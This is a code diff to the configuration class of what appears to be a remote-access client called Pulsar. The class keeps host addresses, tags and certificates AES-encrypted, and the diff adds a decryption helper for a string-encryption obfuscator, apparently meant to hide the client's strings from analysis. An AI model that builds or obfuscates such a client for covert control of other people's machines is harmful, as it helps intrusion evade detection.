@@ -1,9 +1,10 @@
-﻿using Pulsar.Common.Cryptography;
+using Pulsar.Common.Cryptography;
 using System;
 using System.IO;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
+using System.Linq;
 
 namespace Pulsar.Client.Config
 {
@@ -47,6 +48,7 @@ namespace Pulsar.Client.Config
             SetupPaths();
             return true;
         }
+
 #else
         public static string VERSION = "";
         public static string HOSTS = "";
@@ -80,6 +82,7 @@ namespace Pulsar.Client.Config
         public static bool Initialize()
         {
             if (string.IsNullOrEmpty(VERSION)) return false;
+
             var aes = new Aes256(ENCRYPTIONKEY);
             TAG = aes.Decrypt(TAG);
             VERSION = aes.Decrypt(VERSION);
@@ -91,8 +94,38 @@ namespace Pulsar.Client.Config
             LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
             SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
             SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
+
             SetupPaths();
             return VerifyHash();
+        }
+
+        // Added for AdvancedStringEncryptionTransformer
+        public static string DecryptString(string encryptedText, string key)
+        {
+            try
+            {
+                byte[] fullData = Convert.FromBase64String(encryptedText);
+                byte[] iv = fullData.Take(16).ToArray();
+                byte[] cipherText = fullData.Skip(16).ToArray();
+
+                using (Aes aes = Aes.Create())
+                {
+                    aes.Key = Encoding.UTF8.GetBytes(key.PadRight(32, '\0'));
+                    aes.IV = iv;
+
+                    using (MemoryStream ms = new MemoryStream(cipherText))
+                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))
+                    using (StreamReader sr = new StreamReader(cs))
+                    {
+                        return sr.ReadToEnd();
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Decryption failed: {ex.Message}");
+                return encryptedText;
+            }
         }
 #endif
 
@@ -107,9 +140,11 @@ namespace Pulsar.Client.Config
             try
             {
                 var csp = (RSACryptoServiceProvider)SERVERCERTIFICATE.PublicKey.Key;
-                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY)), CryptoConfig.MapNameToOID("SHA256"),
-                    Convert.FromBase64String(SERVERSIGNATURE));
-
+                return csp.VerifyHash(
+                    Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY)),
+                    CryptoConfig.MapNameToOID("SHA256"),
+                    Convert.FromBase64String(SERVERSIGNATURE)
+                );
             }
             catch (Exception)
             {
